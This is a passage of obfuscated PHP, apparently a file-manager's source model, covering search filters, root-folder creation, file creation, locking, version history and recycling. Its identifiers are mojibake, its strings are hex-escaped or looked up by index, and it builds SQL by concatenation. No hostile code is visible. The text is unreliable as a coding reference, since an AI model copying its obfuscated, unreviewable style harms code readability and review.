(!$‘ïÛ»¼Ç) { return $¯‡˜ıåì; } $ÃËê’ìö = array($Šş¬¤ïÇ[192] => array($Šş¬¤ïÇ[7], $‘ïÛ»¼Ç)); $‚ù¿¥œ = $this->field($Šş¬¤ïÇ[2249])->where($ÃËê’ìö)->limit($‚¦áà×)->select(); $¯‡˜ıåì = array_merge($¯‡˜ıåì, array_to_keyvalue($‚ù¿¥œ, $Šş¬¤ïÇ[12], $Šş¬¤ïÇ[193])); $¯‡˜ıåì = array_slice($¯‡˜ıåì, 0, intval($‚¦áà×)); return $¯‡˜ıåì; } private function _listSearchBindPinyin($ÂãÇ‡÷, &$„Ì“¸¦, &$ÖÑ¯ìÚŠ) { $ÂÌÃ…°ó =& $_SERVER[Ùæõ‰Ï’]; if (!isset($ÂãÇ‡÷[$ÂÌÃ…°ó[2077]]) || !$ÂãÇ‡÷[$ÂÌÃ…°ó[2077]]) { return; } if (!Input::check($ÂãÇ‡÷[$ÂÌÃ…°ó[2077]], $ÂÌÃ…°ó[394]) || strlen($ÂãÇ‡÷[$ÂÌÃ…°ó[2077]]) < 2) { return; } $¥é™˜Ñá = "\x4c\105\106\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\x73\x6f\165\162\x63\145\137\155\x65\x74\x61\x20\x6d\145\164\x61\40\157\156\x20\163\x6f\165\162\143\x65\56\x73\157\x75\x72\143\145\111\x44\40\75\x20\155\x65\x74\141\56\163\x6f\165\x72\x63\145\111\x44"; $şÓ±Î¿ = array(); $ÖÑ¯ìÚŠ = str_replace(array($ÂÌÃ…°ó[262], $ÂÌÃ…°ó[53], $ÂÌÃ…°ó[2250]), $ÂÌÃ…°ó[12], $ÖÑ¯ìÚŠ); $ÖÑ¯ìÚŠ = $ÂÌÃ…°ó[511] . str_replace($ÂÌÃ…°ó[50], $ÂÌÃ…°ó[512], $ÖÑ¯ìÚŠ); $¢»şˆÁ… = $„Ì“¸¦[$ÂÌÃ…°ó[32]]; unset($„Ì“¸¦[$ÂÌÃ…°ó[32]]); foreach ($„Ì“¸¦ as $àŠ³èë§ => $¸Ê¡ä) { $şÓ±Î¿[$ÂÌÃ…°ó[511] . $àŠ³èë§] = $¸Ê¡ä; } foreach ($¢»şˆÁ… as $Ş²äÊÅ¹) { $şÓ±Î¿[] = array($ÂÌÃ…°ó[516] => $Ş²äÊÅ¹, $ÂÌÃ…°ó[1091] => $ÂÌÃ…°ó[2081], array($ÂÌÃ…°ó[2251] => $Ş²äÊÅ¹, $ÂÌÃ…°ó[2252] => array($ÂÌÃ…°ó[7], array($ÂÌÃ…°ó[538], $ÂÌÃ…°ó[537])))); } $this->join($¥é™˜Ñá); $„Ì“¸¦ = $şÓ±Î¿; } private function _parseSearchWhere($®»¸¥) { $àêîúÔØ =& $_SERVER[Ùæõ‰Ï’]; $÷ŸòòÕ = array(); if (isset($®»¸¥[$àêîúÔØ[843]]) && $®»¸¥[$àêîúÔØ[843]]) { $÷ŸòòÕ[$àêîúÔØ[88]] = array($àêîúÔØ[2253], $®»¸¥[$àêîúÔØ[843]]); } if (isset($®»¸¥[$àêîúÔØ[844]]) && $®»¸¥[$àêîúÔØ[844]]) { $êòÄ´–µ = array($àêîúÔØ[2254], $®»¸¥[$àêîúÔØ[844]]); if ($÷ŸòòÕ[$àêîúÔØ[88]]) { $÷ŸòòÕ[$àêîúÔØ[88]] = array($÷ŸòòÕ[$àêîúÔØ[88]], $êòÄ´–µ, $àêîúÔØ[2255]); } else { $÷ŸòòÕ[$àêîúÔØ[88]] = $êòÄ´–µ; } } if (isset($®»¸¥[$àêîúÔØ[2247]]) && $®»¸¥[$àêîúÔØ[2247]] > 0) { $÷ŸòòÕ[$àêîúÔØ[79]] = array($àêîúÔØ[2253], $®»¸¥[$àêîúÔØ[2247]]); } if (isset($®»¸¥[$àêîúÔØ[2248]]) && $®»¸¥[$àêîúÔØ[2248]]) { $êòÄ´–µ = array($àêîúÔØ[2254], $®»¸¥[$àêîúÔØ[2248]]); if ($÷ŸòòÕ[$àêîúÔØ[79]]) { $÷ŸòòÕ[$àêîúÔØ[79]] = array($÷ŸòòÕ[$àêîúÔØ[79]], $êòÄ´–µ, $àêîúÔØ[2255]); } else { $÷ŸòòÕ[$àêîúÔØ[79]] = $êòÄ´–µ; } } if (isset($®»¸¥[$àêîúÔØ[662]]) && $®»¸¥[$àêîúÔØ[662]]) { $÷ŸòòÕ[] = array($àêîúÔØ[529] => $®»¸¥[$àêîúÔØ[662]], $àêîúÔØ[527] => $®»¸¥[$àêîúÔØ[662]], $àêîúÔØ[1091] => $àêîúÔØ[2081]); } if (isset($®»¸¥[$àêîúÔØ[486]]) && $®»¸¥[$àêîúÔØ[486]]) { $³è²ˆ§ï = $®»¸¥[$àêîúÔØ[486]]; if ($³è²ˆ§ï == $àêîúÔØ[78]) { $÷ŸòòÕ[$àêîúÔØ[485]] = 1; } else { if ($³è²ˆ§ï == $àêîúÔØ[2256]) { $÷ŸòòÕ[$àêîúÔØ[485]] = 0; } else { if ($³è²ˆ§ï) { $³è²ˆ§ï = is_array($³è²ˆ§ï) ? $³è²ˆ§ï : explode($àêîúÔØ[50], $³è²ˆ§ï); $÷ŸòòÕ[$àêîúÔØ[486]] = array($àêîúÔØ[492], $³è²ˆ§ï); $÷ŸòòÕ[$àêîúÔØ[485]] = 0; } } } } $this->_parseSearchParent($®»¸¥, $÷ŸòòÕ); if (isset($®»¸¥[$àêîúÔØ[2077]]) && trim($®»¸¥[$àêîúÔØ[2077]])) { $ß¡±ÈÒ = trim($®»¸¥[$àêîúÔØ[2077]]); $½’ ½­ = explode($àêîúÔØ[53], $ß¡±ÈÒ); if (strlen($ß¡±ÈÒ) > 2 && (substr($ß¡±ÈÒ, 0, 1) == $àêîúÔØ[121] && substr($ß¡±ÈÒ, -1) == $àêîúÔØ[121]) || substr($ß¡±ÈÒ, 0, 1) == $àêîúÔØ[58] && substr($ß¡±ÈÒ, -1) == $àêîúÔØ[58]) { $ß¡±ÈÒ = substr($ß¡±ÈÒ, 1, -1); $½’ ½­ = array($ß¡±ÈÒ); } $÷ŸòòÕ[$àêîúÔØ[32]] = array(array($àêîúÔØ[612], $àêîúÔØ[2079] . $ß¡±ÈÒ . $àêîúÔØ[2079])); if (count($½’ ½­) > 1) { $÷ŸòòÕ[$àêîúÔØ[32]] = array(); foreach ($½’ ½­ as $Æ¿÷Ì°) { if (!trim($Æ¿÷Ì°)) { continue; } $÷ŸòòÕ[$àêîúÔØ[32]][] = array($àêîúÔØ[612], $àêîúÔØ[2079] . trim($Æ¿÷Ì°) . $àêîúÔØ[2079]); } } } return $÷ŸòòÕ; } private function _parseSearchParent($€ÍôÜ»Ğ, &$î£›ö—) { $ı—áüŠü =& $_SERVER[Ùæõ‰Ï’]; if (!isset($€ÍôÜ»Ğ[$ı—áüŠü[192]]) || !$€ÍôÜ»Ğ[$ı—áüŠü[192]]) { return; } $û‘ôŒÊÜ = $this->pathInfo($€ÍôÜ»Ğ[$ı—áüŠü[192]]); $Ó·ç‹Ï = $û‘ôŒÊÜ[$ı—áüŠü[192]] . $ı—áüŠü[12] === $ı—áüŠü[228]; $ÒŠÓ¨ĞÄ = $û‘ôŒÊÜ[$ı—áüŠü[190]] == $ı—áüŠü[578]; if ($û‘ôŒÊÜ[$ı—áüŠü[595]] == $ı—áüŠü[596]) { $ğÈ„à˜ñ = $this->sourceInfo($€ÍôÜ»Ğ[$ı—áüŠü[192]]); $û‘ôŒÊÜ[$ı—áüŠü[584]] = $ğÈ„à˜ñ[$ı—áüŠü[584]]; } $î£›ö—[$ı—áüŠü[652]] = array($ı—áüŠü[612], $û‘ôŒÊÜ[$ı—áüŠü[584]] . $€ÍôÜ»Ğ[$ı—áüŠü[192]] . $ı—áüŠü[613]); $’ëĞŒºÚ = isset($€ÍôÜ»Ğ[$ı—áüŠü[1938]]) && in_array($ı—áüŠü[578], $€ÍôÜ»Ğ[$ı—áüŠü[1938]]); if (!$’ëĞŒºÚ || !$ÒŠÓ¨ĞÄ || !$Ó·ç‹Ï || !$û‘ôŒÊÜ[$ı—áüŠü[487]]) { return; } if (!AuthModel::authCheckRoot($û‘ôŒÊÜ[$ı—áüŠü[487]][$ı—áüŠü[488]])) { return; } $¬ˆü¶Üâ = $û‘ôŒÊÜ[$ı—áüŠü[569]] . $ı—áüŠü[12]; if ($¬ˆü¶Üâ == $ı—áüŠü[91]) { unset($î£›ö—[$ı—áüŠü[652]]); $î£›ö—[$ı—áüŠü[190]] = self::TYPE_GROUP; return; } $ƒ’­º„‹ = Model($ı—áüŠü[585])->groupChildrenAll($¬ˆü¶Üâ); $Â•·ö = count($ƒ’­º„‹); if ($Â•·ö <= 1) { return; } $±ƒàÇõ› = array($ı—áüŠü[192] => 0, $ı—áüŠü[190] => self::TYPE_GROUP, $ı—áüŠü[569] => array($ı—áüŠü[7], $ƒ’­º„‹)); $æäà¹² = $this->field($ı—áüŠü[2257])->where($±ƒàÇõ›)->limit($Â•·ö)->select(); $î£›ö—[$ı—áüŠü[652]] = array(); foreach ($æäà¹² as $¯Ş¼Úª·) { $î£›ö—[$ı—áüŠü[652]][] = array($ı—áüŠü[612], $ı—áüŠü[594] . $¯Ş¼Úª·[$ı—áüŠü[193]] . $ı—áüŠü[613]); } $î£›ö—[$ı—áüŠü[652]][] = $ı—áüŠü[2081]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ğÈìƒõª) { $È´Ø™ˆ´ =& $_SERVER[Ùæõ‰Ï’]; $üİ…Í = Model($È´Ø™ˆ´[577])->where(array($È´Ø™ˆ´[1772] => $ğÈìƒõª))->find(); $ÔÀœãÈ× = $this->_mkdirRoot(SourceModel::TYPE_USER, $ğÈìƒõª, $üİ…Í[$È´Ø™ˆ´[32]]); $this->userDesktopAdd($ÔÀœãÈ×); return $ÔÀœãÈ×; } public function userDesktopAdd($Áš—) { $ĞÅœÁĞš =& $_SERVER[Ùæõ‰Ï’]; $“ÈÏ—áÏ = LNG($ĞÅœÁĞš[2258]); $Ç°Æ›Öò = $this->mkdir($Áš—, $“ÈÏ—áÏ); $this->metaSet($Ç°Æ›Öò, $ĞÅœÁĞš[2259], $ĞÅœÁĞš[91]); $this->metaSet($Áš—, $ĞÅœÁĞš[2260], $Ç°Æ›Öò); } public function userPathSafeAdd($ôìİï”Ô) { $®Éšâ‡û =& $_SERVER[Ùæõ‰Ï’]; $Ñó‚ó‘š = Model($®Éšâ‡û[577])->getInfoFull($ôìİï”Ô); if (!$Ñó‚ó‘š) { return !1; } if (_get($Ñó‚ó‘š, $®Éšâ‡û[599])) { return $Ñó‚ó‘š[$®Éšâ‡û[539]][$®Éšâ‡û[2261]]; } $Ø—¯íü = $this->_mkdirRoot(SourceModel::TYPE_USER, $ôìİï”Ô, $®Éšâ‡û[2262], $®Éšâ‡û[506]); Model($®Éšâ‡û[577])->metaSet($ôìİï”Ô, $®Éšâ‡û[2261], $Ø—¯íü); $this->metaSet($Ø—¯íü, $®Éšâ‡û[2263], $ôìİï”Ô); return $Ø—¯íü; } public function groupRootAdd($ô¶æ†ø) { $¼‹ß“ºç =& $_SERVER[Ùæõ‰Ï’]; $À˜Ë•Êƒ = Model($¼‹ß“ºç[585])->where(array($¼‹ß“ºç[2071] => $ô¶æ†ø))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ô¶æ†ø, $À˜Ë•Êƒ[$¼‹ß“ºç[32]]); } public function systemRootPathAdd($êÈöÙ°’) { if ($êÈöÙ°’ != $_SERVER[Ùæõ‰Ï’][605]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $êÈöÙ°’); } public function userRootRemove($ª÷‹ —) { $¤…†Şş = $this->targetSourceRoot(SourceModel::TYPE_USER, $ª÷‹ —, !0); foreach ($¤…†Şş as $×¹®Â§›) { if (!$×¹®Â§›) { continue; } $this->remove($×¹®Â§›[$_SERVER[Ùæõ‰Ï’][193]], !1); } } public function groupRootRemove($æ¢Ìˆì) { $œÇ”ªø· = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $æ¢Ìˆì); if (!$œÇ”ªø·) { return; } $this->remove($œÇ”ªø·[$_SERVER[Ùæõ‰Ï’][193]], !1); } private function _mkdirRoot($Ö¡­…µ, $¾¸”ÉÚÄ, $Ø¹ôõåÜ, $ùŸÍäÑŞ = '') { $ŸÃø‚‚ =& $_SERVER[Ùæõ‰Ï’]; $‘øÂ”¶ï = defined($ŸÃø‚‚[2205]) ? USER_ID : 0; $è¤ß‹àî = array($ŸÃø‚‚[477] => 0, $ŸÃø‚‚[648] => $Ö¡­…µ, $ŸÃø‚‚[649] => $¾¸”ÉÚÄ, $ŸÃø‚‚[646] => 1, $ŸÃø‚‚[650] => $‘øÂ”¶ï, $ŸÃø‚‚[651] => $‘øÂ”¶ï, $ŸÃø‚‚[647] => $ùŸÍäÑŞ, $ŸÃø‚‚[652] => $ŸÃø‚‚[594], $ŸÃø‚‚[504] => 0, $ŸÃø‚‚[617] => 0, $ŸÃø‚‚[542] => 0, $ŸÃø‚‚[653] => $ŸÃø‚‚[12]); if ($î¶ŠœÄğ = $this->where($è¤ß‹àî)->find()) { return $î¶ŠœÄğ[$ŸÃø‚‚[193]]; } $©¤ßÛç = "\x4d\x6f\144\145\x6c\x53\157\x75\162\x63\145\x2e\x6d\153\144\x69\x72\x52\157\x6f\x74\56{$Ö¡­…µ}\56{$¾¸”ÉÚÄ}\x2e" . $Ø¹ôõåÜ; CacheLock::lock($©¤ßÛç); $è¤ß‹àî[$ŸÃø‚‚[32]] = $Ø¹ôõåÜ; $¶²ÉµëŒ = $this->add($è¤ß‹àî); $¬Õø÷« = array($ŸÃø‚‚[654] => short_id($¶²ÉµëŒ)); $this->where(array($ŸÃø‚‚[491] => $¶²ÉµëŒ))->save($¬Õø÷«); CacheLock::unlock($©¤ßÛç); return $¶²ÉµëŒ; } private function targetSourceRoot($òÃİ—¦Š, $µª¬ğ«å, $èÔã©×¯ = false) { $˜Ì±¿ç³ =& $_SERVER[Ùæõ‰Ï’]; $¹•ã¶Ú = array($˜Ì±¿ç³[477] => 0, $˜Ì±¿ç³[648] => $òÃİ—¦Š, $˜Ì±¿ç³[649] => $µª¬ğ«å); if ($èÔã©×¯) { $ë‚û¢È¸ = $this->where($¹•ã¶Ú)->select(); return $ë‚û¢È¸ ? $ë‚û¢È¸ : array(); } $ñóèá™ù = $this->where($¹•ã¶Ú)->find(); return $ñóèá™ù ? $ñóèá™ù : array(); } public function sourceRootGroup($ğÀ»ßœ) { $ÜÈÔÂ‡‡ =& $_SERVER[Ùæõ‰Ï’]; if (is_string($ğÀ»ßœ)) { $ğÀ»ßœ = array($ğÀ»ßœ); } $ì¬âŒ†• = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ğÀ»ßœ, $ÜÈÔÂ‡‡[220]); $‚æÈ½û¾ = array($ÜÈÔÂ‡‡[445] => $ì¬âŒ†•, $ÜÈÔÂ‡‡[442] => array($ÜÈÔÂ‡‡[841] => count($ğÀ»ßœ))); $this->_listDataApply($‚æÈ½û¾[$ÜÈÔÂ‡‡[445]]); $this->_listMake($‚æÈ½û¾); return array_to_keyvalue($‚æÈ½û¾[$ÜÈÔÂ‡‡[85]], $ÜÈÔÂ‡‡[569]); } public function mkfile($€òÃœË½, $‹àíÉÏ, $âæÛäÑ = '', $Œöş¡¥ = REPEAT_RENAME) { $ç§â‡°ü =& $_SERVER[Ùæõ‰Ï’]; $²ú¼©ë½ = Model($ç§â‡°ü[674])->addFileByContent($âæÛäÑ, $‹àíÉÏ); return $this->_createFileCall($€òÃœË½, $‹àíÉÏ, $²ú¼©ë½, $Œöş¡¥, $ç§â‡°ü[1440]); } public function addFile($”’Óóñ„, $†àÙä…ò, $Ê‡¢¾×¼, $Ğ¼ÁØÇ = false, $şùª¿€ˆ = REPEAT_RENAME) { $Ôªåœæ˜ = Model($_SERVER[Ùæõ‰Ï’][674])->addFile($†àÙä…ò, $Ê‡¢¾×¼, $Ğ¼ÁØÇ); return $this->_createFileCall($”’Óóñ„, $Ê‡¢¾×¼, $Ôªåœæ˜, $şùª¿€ˆ); } public function addFileByFileID($Æ‚òü, $ÍáË‡óí, $Î¸úö†í, $¢™ßìäÂ = REPEAT_RENAME) { $Œó¾¦Øä =& $_SERVER[Ùæõ‰Ï’]; $ åà£™ğ = Model($Œó¾¦Øä[674])->find($ÍáË‡óí); Model($Œó¾¦Øä[674])->linkAdd($ÍáË‡óí); return $this->_createFileCall($Æ‚òü, $Î¸úö†í, $ åà£™ğ, $¢™ßìäÂ); } public function addFileByRemote($Œèòšæ‡, $ƒ»”“œ, $ßúÖû‰´, $¹¡ßÊ´Ş = array(), $ÁàúÈğÖ = REPEAT_RENAME) { $ÒÕ”õó€ = Model($_SERVER[Ùæõ‰Ï’][674])->addFileByRemote($ƒ»”“œ, $ßúÖû‰´, $¹¡ßÊ´Ş); return $this->_createFileCall($Œèòšæ‡, $ßúÖû‰´, $ÒÕ”õó€, $ÁàúÈğÖ); } private function _createFileCall($ÛÅÑæ‘³, $ĞñİºŸ³, $€ÊÍ¬¾·, $ØùÂä, $‚ğÕ†Ø‹ = "\x75\x70\x6c\x6f\x61\144") { $ş¢÷Ò¹ß =& $_SERVER[Ùæõ‰Ï’]; $íÚıèÈ = !1; $this->setMasterDB(); $this->lockWriteStart($ÛÅÑæ‘³, $ĞñİºŸ³); $š£Á¦é‘ = $this->fileNameExist($ÛÅÑæ‘³, $ĞñİºŸ³); $èèÏ÷ = $this->_createFile($ÛÅÑæ‘³, $ĞñİºŸ³, $€ÊÍ¬¾·, $ØùÂä, $íÚıèÈ); if (!$íÚıèÈ) { Model($ş¢÷Ò¹ß[544])->remove($€ÊÍ¬¾·[$ş¢÷Ò¹ß[541]]); } if ($íÚıèÈ && $èèÏ÷ && $èèÏ÷ != $š£Á¦é‘) { Model($ş¢÷Ò¹ß[2231])->eventCreate($èèÏ÷, $‚ğÕ†Ø‹); } $this->lockWriteEnd($ÛÅÑæ‘³, $ĞñİºŸ³); return $èèÏ÷; } public function mkdir($¦µ´£ğ¦, $·ğãö¥, $¸ÈÜªıÆ = REPEAT_SKIP) { $œàÓ­¸ =& $_SERVER[Ùæõ‰Ï’]; $this->setMasterDB(); $Î±ò Ì = $this->sourceInfo($¦µ´£ğ¦); if (!$Î±ò Ì) { return !1; } $this->lockWriteStart($¦µ´£ğ¦, $·ğãö¥); if ($¸ÈÜªıÆ !== !1) { $óÉ€Ùˆé = $this->fileNameExist($¦µ´£ğ¦, $·ğãö¥); if ($óÉ€Ùˆé && $¸ÈÜªıÆ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¦µ´£ğ¦, $·ğãö¥); return $óÉ€Ùˆé; } $·ğãö¥ = $this->fileNameAuto($¦µ´£ğ¦, $·ğãö¥, $¸ÈÜªıÆ); } $˜ú¾Ôßí = array($œàÓ­¸[646] => 1, $œàÓ­¸[494] => $·ğãö¥, $œàÓ­¸[647] => $œàÓ­¸[12], $œàÓ­¸[542] => 0, $œàÓ­¸[617] => 0); $î…”ÅÍ¨ = $this->_addSource($˜ú¾Ôßí, $Î±ò Ì); Model($œàÓ­¸[2231])->eventCreate($î…”ÅÍ¨, $œàÓ­¸[1441]); $this->lockWriteEnd($¦µ´£ğ¦, $·ğãö¥); return $î…”ÅÍ¨; } public function listSourceRoot($Ô™¨Éî, $‚ßŒüÀº, $Şé³“´Ó = "\163\157\165\x72\x63\145\x49\x44\x2c\x74\x61\162\147\145\164\111\104\54\x73\x69\x7a\x65") { $é»¥à“Å =& $_SERVER[Ùæõ‰Ï’]; $„ËÌê¦ = $é»¥à“Å[454]; $ƒÕœ›Æå = array(); $„çü¶€„ = 1024 * 50; $ù«ÕÜ¯ = is_array($ù«ÕÜ¯) ? $ù«ÕÜ¯ : array(); $³ôª­”Ê = count($‚ßŒüÀº); $ÑçœÈ‹© = $this->tablePrefix . $é»¥à“Å[2264]; for ($í„¯ª– = 0; $í„¯ª– < $³ôª­”Ê; $í„¯ª–++) { $ş˜Áüê® = $‚ßŒüÀº[$í„¯ª–]; $„ËÌê¦ .= "\123\x45\x4c\105\103\x54\40\52\x20\106\122\x4f\115\x20\x28\x53\105\114\x45\x43\124\x20{$Şé³“´Ó}\x20\x46\x52\117\x4d\x20\x60{$ÑçœÈ‹©}\140\x20\127\x48\x45\x52\x45\40"; $„ËÌê¦ .= "\140\x70\141\162\145\x6e\x74\x49\104\140\75\x30\40\101\x4e\x44\x20\x60\x74\x61\162\x67\145\164\x49\104\x60\x3d{$ş˜Áüê®}\40\101\x4e\x44\40\140\164\141\162\147\145\164\x54\x79\160\145\x60\x3d{$Ô™¨Éî}\x20\x61\156\x64\40\146\x69\154\x65\124\x79\160\145\x3d\47\47\x20\x6c\x69\x6d\151\x74\x20\x31\51\x20\141\x73\40\164\142\x5f{$í„¯ª–}\40\125\116\111\x4f\116\x20\101\x4c\x4c\x20"; if ((strlen($„ËÌê¦) >= $„çü¶€„ || $í„¯ª– == $³ôª­”Ê - 1) && $„ËÌê¦) { $„ËÌê¦ = substr($„ËÌê¦, 0, -strlen($é»¥à“Å[1129])); $Ğ¶çÓ‹ = $this->query($„ËÌê¦); $„ËÌê¦ = $é»¥à“Å[12]; $ƒÕœ›Æå = array_merge($ƒÕœ›Æå, $Ğ¶çÓ‹); } } return $ƒÕœ›Æå; } private function _createFile($ùçáŠÃİ, $¬ıŸ¥æ”, $„ÊäğßÁ, $×­øµÊ, &$•ÀàÂ£‘) { $ëàÕË¹Â =& $_SERVER[Ùæõ‰Ï’]; $ Â†ìŞŸ = $this->sourceInfo($ùçáŠÃİ); if (!$„ÊäğßÁ || !$ Â†ìŞŸ) { return !1; } if ($×­øµÊ !== !1) { $ĞŸÅ™¥ = $this->fileNameExist($ùçáŠÃİ, $¬ıŸ¥æ”); } $•ÀàÂ£‘ = !0; if ($×­øµÊ && $ĞŸÅ™¥) { if ($×­øµÊ == REPEAT_SKIP) { $•ÀàÂ£‘ = !1; return $ĞŸÅ™¥; } else { if ($×­øµÊ == REPEAT_REPLACE) { $Öéü–ÛŸ = $this->sourceInfo($ĞŸÅ™¥); $µŠªÏ§ = $this->fileHistory($Öéü–ÛŸ, $„ÊäğßÁ[$ëàÕË¹Â[541]], $„ÊäğßÁ[$ëàÕË¹Â[79]]); if (!$µŠªÏ§) { $•ÀàÂ£‘ = !1; } else { $this->folderSizeReset($ùçáŠÃİ); } return $ĞŸÅ™¥; } else { $¬ıŸ¥æ” = $this->fileNameAuto($ùçáŠÃİ, $¬ıŸ¥æ”, $×­øµÊ, !1); } } } $…å˜¿„¢ = array($ëàÕË¹Â[646] => 0, $ëàÕË¹Â[494] => $¬ıŸ¥æ”, $ëàÕË¹Â[647] => substr(get_path_ext($¬ıŸ¥æ”), 0, 10), $ëàÕË¹Â[542] => $„ÊäğßÁ[$ëàÕË¹Â[541]], $ëàÕË¹Â[617] => $„ÊäğßÁ[$ëàÕË¹Â[79]]); $Á–ƒÙáŸ = $this->_addSource($…å˜¿„¢, $ Â†ìŞŸ); $this->folderSizeReset($ùçáŠÃİ, intval($…å˜¿„¢[$ëàÕË¹Â[79]])); return $Á–ƒÙáŸ; } protected function fileHistory($¾ÔÊààİ, $Ğè¡Ã¨’, $éŠ™­¶©) { $²ÎÀ±Ù· =& $_SERVER[Ùæõ‰Ï’]; if ($¾ÔÊààİ[$²ÎÀ±Ù·[541]] == $Ğè¡Ã¨’) { return !1; } $this->checkLock($¾ÔÊààİ[$²ÎÀ±Ù·[193]], $Ğè¡Ã¨’); Model($²ÎÀ±Ù·[2265])->addHistory($¾ÔÊààİ); $ÁŸæèÃŒ = array($²ÎÀ±Ù·[651] => USER_ID, $²ÎÀ±Ù·[498] => time(), $²ÎÀ±Ù·[541] => $Ğè¡Ã¨’, $²ÎÀ±Ù·[79] => $éŠ™­¶©); $this->where(array($²ÎÀ±Ù·[491] => $¾ÔÊààİ[$²ÎÀ±Ù·[193]]))->save($ÁŸæèÃŒ); $this->sourceCacheClear($¾ÔÊààİ[$²ÎÀ±Ù·[193]]); return !0; } public function checkLock($ÎÉêÑèï, $ÉÎğ¢³ ) { $ÏºÁÇõÖ =& $_SERVER[Ùæõ‰Ï’]; $øµÀàó‰ = $this->pathInfo($ÎÉêÑèï); if (!$this->fileIsLock($øµÀàó‰, !0)) { return; } $ıÏ–ø§Ş = Session::get($ÏºÁÇõÖ[2266]); $à¼ÓËšß = substr($øµÀàó‰[$ÏºÁÇõÖ[32]], 0, -1 - strlen($øµÀàó‰[$ÏºÁÇõÖ[169]])) . $ÏºÁÇõÖ[1306] . $ıÏ–ø§Ş . $ÏºÁÇõÖ[10] . $øµÀàó‰[$ÏºÁÇõÖ[169]]; $ŠÜ¤œŒø = Model($ÏºÁÇõÖ[674])->find($ÉÎğ¢³ ); $this->_createFileCall($øµÀàó‰[$ÏºÁÇõÖ[192]], $à¼ÓËšß, $ŠÜ¤œŒø, REPEAT_REPLACE, $ÏºÁÇõÖ[1440]); $“üµˆ ¦ = $øµÀàó‰[$ÏºÁÇõÖ[539]][$ÏºÁÇõÖ[610]]; $—ÜÚàğÙ = $“üµˆ ¦[$ÏºÁÇõÖ[2267]] ? $“üµˆ ¦[$ÏºÁÇõÖ[2267]] : $“üµˆ ¦[$ÏºÁÇõÖ[32]]; show_json(LNG($ÏºÁÇõÖ[2268]) . $ÏºÁÇõÖ[2269] . LNG($ÏºÁÇõÖ[2270]) . $ÏºÁÇõÖ[2271] . $—ÜÚàğÙ . $ÏºÁÇõÖ[2272], !1); } public function fileIsLock($Ş·´Î´…, $ëÜÈîè = false) { $ÄŸïôœ˜ =& $_SERVER[Ùæõ‰Ï’]; if (!_get($Ş·´Î´…, $ÄŸïôœ˜[606], 0)) { return !1; } if ($Ş·´Î´…[$ÄŸïôœ˜[539]][$ÄŸïôœ˜[609]] != USER_ID) { return !0; } $•ËËØÁß = $GLOBALS[$ÄŸïôœ˜[6]][$ÄŸïôœ˜[92]][$ÄŸïôœ˜[607]]; if ($Ş·´Î´…[$ÄŸïôœ˜[539]][$ÄŸïôœ˜[608]] <= time() - $•ËËØÁß) { $this->metaSet($Ş·´Î´…[$ÄŸïôœ˜[193]], $ÄŸïôœ˜[609], null); $this->metaSet($Ş·´Î´…[$ÄŸïôœ˜[193]], $ÄŸïôœ˜[608], null); } if ($ëÜÈîè) { $this->metaSet($Ş·´Î´…[$ÄŸïôœ˜[193]], $ÄŸïôœ˜[608], time()); } return !1; } private function _addSource($„ü¸É˜ô, $·‚óı¬) { $¡¨˜ñÚ =& $_SERVER[Ùæõ‰Ï’]; $ø»¦˜× = defined($¡¨˜ñÚ[2205]) ? USER_ID : 0; $æ¢öÊˆ‰ = array($¡¨˜ñÚ[648] => $·‚óı¬[$¡¨˜ñÚ[190]], $¡¨˜ñÚ[649] => $·‚óı¬[$¡¨˜ñÚ[569]], $¡¨˜ñÚ[650] => $ø»¦˜×, $¡¨˜ñÚ[651] => $ø»¦˜×, $¡¨˜ñÚ[477] => $·‚óı¬[$¡¨˜ñÚ[193]], $¡¨˜ñÚ[652] => $·‚óı¬[$¡¨˜ñÚ[584]] . $·‚óı¬[$¡¨˜ñÚ[193]] . $¡¨˜ñÚ[50], $¡¨˜ñÚ[504] => 0, $¡¨˜ñÚ[653] => $¡¨˜ñÚ[12]); $„ü¸É˜ô = array_merge($æ¢öÊˆ‰, $„ü¸É˜ô); $this->updateModifyTime($„ü¸É˜ô[$¡¨˜ñÚ[192]]); $İÒÇä‘² = $¡¨˜ñÚ[2273] . $·‚óı¬[$¡¨˜ñÚ[193]]; if (isset(self::$cacheChildList[$İÒÇä‘²])) { unset(self::$cacheChildList[$İÒÇä‘²]); } static $¸‹›áíë = false; if (!$¸‹›áíë) { Hook::trigger($¡¨˜ñÚ[636], $„ü¸É˜ô); $¸‹›áíë = !0; } $†ƒ¸Ñ¾ = $this->add($„ü¸É˜ô); $ùÏ±æº¿ = array($¡¨˜ñÚ[654] => short_id($†ƒ¸Ñ¾)); $this->where(array($¡¨˜ñÚ[491] => $†ƒ¸Ñ¾))->save($ùÏ±æº¿); $this->setNamePinyin($†ƒ¸Ñ¾, $„ü¸É˜ô[$¡¨˜ñÚ[32]]); return $†ƒ¸Ñ¾; } public function remove($¸éÉ–¤‡, $º÷Øğç× = true) { $‰•¦ÊöÆ =& $_SERVER[Ùæõ‰Ï’]; $ã´ş© ² = $this->sourceInfo($¸éÉ–¤‡); $¿¡åÍà§ = intval($ã´ş© ²[$‰•¦ÊöÆ[190]]) === self::TYPE_SYSTEM; $àÅƒÃ±š = Model($‰•¦ÊöÆ[508])->get($‰•¦ÊöÆ[2274]) == $‰•¦ÊöÆ[91]; if ($¿¡åÍà§ || $º÷Øğç× || !$àÅƒÃ±š) { return $this->removeNow($¸éÉ–¤‡, $º÷Øğç×); } $ÓÛôĞÌ¢ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $İ¯ØŒ§Ù = $ã´ş© ²[$‰•¦ÊöÆ[190]] == self::TYPE_USER ? $‰•¦ÊöÆ[662] : $‰•¦ÊöÆ[578]; if ($İ¯ØŒ§Ù == $‰•¦ÊöÆ[662]) { $Ë¨Ñ×ŞÊ = Model($‰•¦ÊöÆ[577])->getInfo($ã´ş© ²[$‰•¦ÊöÆ[569]]); $°—Å¾Û¨ = !empty($Ë¨Ñ×ŞÊ[$‰•¦ÊöÆ[2267]]) ? $Ë¨Ñ×ŞÊ[$‰•¦ÊöÆ[2267]] : $Ë¨Ñ×ŞÊ[$‰•¦ÊöÆ[32]]; $°—Å¾Û¨ = $‰•¦ÊöÆ[337] . $°—Å¾Û¨ . 